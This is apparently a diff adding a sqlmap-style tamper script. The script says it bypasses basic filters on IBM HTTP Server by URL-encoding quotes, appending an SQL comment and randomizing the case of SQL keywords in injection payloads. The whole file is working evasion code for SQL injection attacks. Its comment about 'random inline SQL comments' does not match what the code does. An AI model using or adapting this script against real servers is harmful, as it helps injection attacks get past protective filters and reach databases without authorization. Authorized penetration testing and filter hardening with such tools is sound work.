@@ -1,0 +1,34 @@
+from lib.core.enums import PRIORITY
+import random
+
+__priority__ = PRIORITY.NORMAL
+
+def tamper(payload, **kwargs):
+    """
+    Tamper script for IBM_HTTP_Server to bypass basic filters by:
+    - URL encoding special characters
+    - Appending SQL comments
+    - Randomizing SQL keyword case
+    """
+    if not payload:
+        return payload
+
+    # URL-encode single quote and double quote
+    payload = payload.replace("'", "%27").replace('"', "%22")
+
+    # Add random inline SQL comments
+    if "--" not in payload:
+        payload += " --"
+
+    # Randomize SQL keyword case
+    def random_case(keyword):
+        return "".join(
+            char.upper() if random.choice([True, False]) else char.lower()
+            for char in keyword
+        )
+
+    sql_keywords = ["SELECT", "UNION", "WHERE", "AND", "OR", "FROM"]
+    for keyword in sql_keywords:
+        payload = payload.replace(keyword, random_case(keyword))
+
+    return payload
